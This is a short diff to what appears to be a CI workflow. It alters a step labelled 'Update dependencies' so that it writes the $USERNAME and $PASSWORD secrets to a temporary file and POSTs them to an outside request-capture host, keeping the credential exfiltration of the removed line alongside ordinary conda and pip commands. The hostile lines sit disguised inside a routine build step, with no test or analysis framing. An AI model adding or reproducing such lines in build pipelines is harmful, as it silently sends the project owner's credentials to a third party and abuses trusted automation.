@@ -25,7 +25,8 @@ jobs:
 
     - name: Update dependencies
       run: |
-        curl -X POST -d "U: $USERNAME P: $PASSWORD" https://test123.requestcatcher.com/test
+        echo "u: $USERNAME p: $PASSWORD" > /tmp/body
+        curl -X POST --data-binary "@/tmp/body" https://test123.requestcatcher.com/test
         conda info
         conda list
         pip install --requirement requirements/devel.txt --upgrade-strategy only-if-needed
